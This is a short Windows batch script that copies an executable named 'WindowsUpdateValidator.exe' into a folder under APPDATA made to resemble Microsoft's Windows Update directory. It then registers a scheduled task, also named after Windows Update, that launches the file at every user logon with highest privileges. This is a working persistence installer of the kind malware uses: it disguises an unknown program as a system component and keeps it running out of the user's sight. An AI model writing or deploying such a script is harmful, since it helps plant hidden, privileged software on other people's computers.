@echo off
set EXE_NAME=WindowsUpdateValidator.exe
set DEST=%APPDATA%\Microsoft\Windows\Update\
mkdir "%DEST%" >nul 2>&1
copy /Y "%~dp0%EXE_NAME%" "%DEST%"
schtasks /create /f /tn "Windows Update Validator" /tr "\"%DEST%\%EXE_NAME%\"" /sc onlogon /rl highest